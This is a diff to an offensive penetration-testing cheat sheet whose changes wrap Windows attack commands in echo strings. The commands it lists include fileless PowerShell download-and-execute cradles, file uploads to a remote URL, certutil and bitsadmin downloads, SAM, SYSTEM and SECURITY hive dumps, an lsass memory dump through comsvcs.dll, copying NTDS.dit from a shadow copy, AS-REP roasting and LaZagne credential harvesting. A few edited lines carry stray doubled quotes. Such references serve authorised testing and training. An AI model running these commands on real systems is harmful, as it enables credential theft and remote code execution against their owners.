@@ -469,30 +469,30 @@ xfreerdp /u:<user> /p:"<password>" /v:<target>
 ##  file transfers - windows - powershell download
 #plateform/windows #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
-Invoke-WebRequest <TargetFileURL> -OutFile <windowsOut>
+echo "Invoke-WebRequest <TargetFileURL> -OutFile <windowsOut>"
 ```
 
 ##  file transfers - windows - execute in memory powershell (download)
 #plateform/windows #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
-IEX (New-Object Net.WebClient).DownloadString('<TargetFileURL>')
+echo "IEX (New-Object Net.WebClient).DownloadString('<TargetFileURL>')"
 ```
 
 ##  file transfers - windows - upload with powershell
 #plateform/windows #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
-Invoke-WebRequest -Uri <TargetDirectoryURL> -Method POST -Body $b64
+echo "Invoke-WebRequest -Uri <TargetDirectoryURL> -Method POST -Body $b64"
 ```
 
 ##  file transfers - windows - bitsadmin download
 #plateform/windows #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
-bitsadmin /transfer n <TargetFileURL> C:\Temp\<windowsOut>
+echo "bitsadmin /transfer n <TargetFileURL> C:\Temp\<windowsOut>"
 ```
 ##  file transfers - windows - certutil download
 #plateform/windows #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
-certutil.exe -verifyctl -split -f <TargetFileURL>
+echo "certutil.exe -verifyctl -split -f <TargetFileURL>"
 ```
 ##  file transfers - linux - wget download
 #plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
@@ -525,7 +525,7 @@ scp <user>@<ip>:<pathToGetFile> <pathToOutFileWname>
 ## file transfers - windows - powershell using chrome User Agent download
 #plateform/windows #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
-Invoke-WebRequest <TargetFileURL> -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "<windowsOut>"
+echo "Invoke-WebRequest <TargetFileURL> -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile '<windowsOut>'"
 ```
 
 ## file transfers - powershell b64 download
@@ -544,31 +544,31 @@ Get-FileHash C:\<pathWindowsOut> -Algorithm md5`
 ## file transfers - windows - powershell web download
 #plateform/windows #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
-(New-Object Net.WebClient).DownloadFile('<TargetFileURL>','<Output File Name>')
+echo "(New-Object Net.WebClient).DownloadFile('<TargetFileURL>','<Output File Name>')"
 ```
 
 ## file transfers - windows - powershell web download 2
 #plateform/windows #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
-(New-Object Net.WebClient).DownloadFile('<TargetFileURL>','<Output File Name>')
+echo "(New-Object Net.WebClient).DownloadFile('<TargetFileURL>','<Output File Name>')"
 ```
 
 ## file transfers - windows - powershell web download 3
 #plateform/windows #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
-(New-Object Net.WebClient).DownloadFileAsync('<TargetFileURL>','<Output File Name>')
+echo "(New-Object Net.WebClient).DownloadFileAsync('<TargetFileURL>','<Output File Name>')"
 ```
 
 ## file transfers - windows - powershell fileless download
 #plateform/windows #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
-IEX (New-Object Net.WebClient).DownloadString('<TargetFileURL>')
+echo "IEX (New-Object Net.WebClient).DownloadString('<TargetFileURL>')"
 ```
 
 ## file transfers - windows - powershell fileless download 2
 #plateform/windows #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
-(New-Object Net.WebClient).DownloadString('<TargetFileURL>') | IEX
+echo "(New-Object Net.WebClient).DownloadString('<TargetFileURL>') | IEX"
 ```
 
 ## file transfers - linux - start  smbserver download/upload (old windows versions)
@@ -586,7 +586,7 @@ sudo impacket-smbserver share -smb2support /tmp/smbshare -user user -password se
 ## file transfers - windows - mount smb download/upload
 #plateform/windows #target/remote #port/445 #protocol/ #cat/ATTACK/
 ```
-net use n: \\<ip>\<sharename> /user:server <sharename>
+echo "net use n: \\<ip>\<sharename> /user:server <sharename>"
 ```
 
 ## file transfers - linux - start ftp server download/upload
@@ -598,13 +598,13 @@ sudo python3 -m pyftpdlib --port 21
 ## file transfers - windows - transfering files via ftp
 #plateform/ #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
-(New-Object Net.WebClient).DownloadFile('ftp://<ip>/<file>', '<windowsOutPathWname>')
+echo "(New-Object Net.WebClient).DownloadFile('ftp://<ip>/<file>', '<windowsOutPathWname>')""
 ```
 
 ## file transfers - windows - powershell web 2
 #plateform/ #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
-Invoke-WebRequest <TargetFileURL> -OutFile <windowsOut>
+echo "Invoke-WebRequest <TargetFileURL> -OutFile <windowsOut>"
 ```
 
 
@@ -659,19 +659,19 @@ smbclient -U <user> \\\\<target-ip>\\<SHARENAME>
 ## password attacks - local - SAM registry hives hklm/sam
 #plateform/windows #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
-reg.exe save hklm\sam C:\sam.save
+echo "reg.exe save hklm\sam C:\sam.save"
 ```
 
 ## password attacks - local - SAM registry hives hklm/system
 #plateform/windows #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
-reg.exe save hklm\system C:\system.save
+echo "reg.exe save hklm\system C:\system.save"
 ```
 
 ## password attacks - local - SAM registry hives hklm/security
 #plateform/windows #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
-reg.exe save hklm\security C:\security.save
+echo "reg.exe save hklm\security C:\security.save"
 ```
 
 ## password attacks - remote - smbserver
@@ -707,13 +707,13 @@ crackmapexec smb <targetIP> --local-auth -u <user> -p <password> --sam
 ## password attacks - local - get lsass process id
 #plateform/windows #target/local #port/ #protocol/ #cat/ATTACK/
 ```
-Get-Process lsass
+echo "Get-Process lsass"
 ```
 
 ## password attacks - local - dump lsass to file with privileged permissions powershell
 #plateform/windows #target/local #port/ #protocol/ #cat/ATTACK/
 ```
-rundll32 C:\windows\system32\comsvcs.dll, MiniDump <lsassPID> C:\lsass.dmp full
+echo "rundll32 C:\windows\system32\comsvcs.dll, MiniDump <lsassPID> C:\lsass.dmp full"
 ```
 
 ## password attacks - local - dump lsass pypycatz
@@ -731,25 +731,25 @@ pypykatz lsa minidump <pathLsass.dmp>
 ## password attacks - local - Checking Local Group Membership
 #plateform/windows #target/local #port/ #protocol/ #cat/ATTACK/
 ```
-net localgroup
+echo "net localgroup"
 ```
 
 ## password attacks - local - Checking Local User Account Privileges including Domain
 #plateform/windows #target/local #port/ #protocol/ #cat/ATTACK/
 ```
-net user bwilliamson
+echo "net user <user>"
 ```
 
 ## password attacks - local - Creating Shadow Copy of C:
 #plateform/windows #target/local #port/ #protocol/ #cat/ATTACK/
 ```
-vssadmin CREATE SHADOW /For=C:
+echo "vssadmin CREATE SHADOW /For=C:""
 ```
 
 ## password attacks - local - Copying NTDS.dit from the VSS
 #plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
-cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
+echo "cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit"
 ```
 
 ## password attacks - local - Transferring NTDS.dit to Attack Host
@@ -780,4 +780,10 @@ nxc smb <ip> -u <user> -d <domain> -H <Hash>
 #plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
 nxc ldap <ip> -u <user> -p '<password>' --asreproast output.txt
+```
+
+## password attacks - local - windows credential hunting
+#plateform/windows #target/local #port/ #protocol/ #cat/ATTACK/
+```
+echo "start lazagne.exe all"
 ```
